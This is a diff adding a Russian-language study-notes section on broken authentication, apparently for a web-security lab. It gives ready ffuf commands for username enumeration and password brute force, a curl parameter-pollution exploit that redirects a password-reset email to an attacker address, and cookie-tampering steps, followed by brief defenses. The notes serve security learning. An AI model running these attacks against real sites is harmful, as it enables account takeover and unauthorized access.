@@ -1393,3 +1393,46 @@ Cookie vs Токены
 - Истечение сессии через разумное время.
 - Аннулирование сессии на сервере при logout.
 - Логирование действий.
+
+### Broken Authentication
+Векторы атак
+1. **User Enumeration** — определение существующих логинов через разные ответы.
+2. **Brute Force** — перебор паролей.
+3. **Логические ошибки** — подмена параметров при сбросе пароля.
+4. **Манипуляции с cookie** — подделка значений сессии.
+
+1. User Enumeration
+- Форма регистрации: `username=admin` → "username already exists", `username=random` → "registered".
+- Автоматизация через ffuf:
+ffuf -w names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-u http://TARGET/customers/signup -mr "username already exists" \
+-o valid_usernames.txt -of plain
+2. Brute Force
+ffuf -w valid_usernames.txt:W1,passwords.txt:W2 -X POST \
+-d "username=W1&password=W2" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-u http://TARGET/customers/login -fc 200
+-fc 200 отбрасывает неудачные попытки (код 200), оставляя успешные (302).
+
+3. Parameter Pollution при сбросе пароля
+Уязвимость в PHP $_REQUEST: email из GET, а письмо отправляется на email из POST.
+Легитимный запрос:
+curl 'http://TARGET/customers/reset?email=victim@mail.com' \
+-H 'Content-Type: application/x-www-form-urlencoded' \
+-d 'username=victim'
+Эксплойт:
+curl 'http://TARGET/customers/reset?email=victim@mail.com' \
+-H 'Content-Type: application/x-www-form-urlencoded' \
+-d 'username=victim&email=attacker@mail.com'
+4. Манипуляции с cookie
+Plaintext: logged_in=true; admin=false → меняем на admin=true.
+Hash: admin=false → MD5, меняем на MD5 от true.
+Base64: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ== → декодируем, меняем admin на true, кодируем обратно.
+Проверка через curl:
+curl -H "Cookie: logged_in=true; admin=true" http://TARGET/cookie-test
+Защита
+Одинаковые ответы при enumeration.
+Rate limiting, MFA, блокировка аккаунтов.
+Чтение параметров из одного источника ($_GET/$_POST, не $_REQUEST).
+Подпись cookie (HMAC, JWT) или хранение состояния на сервере.
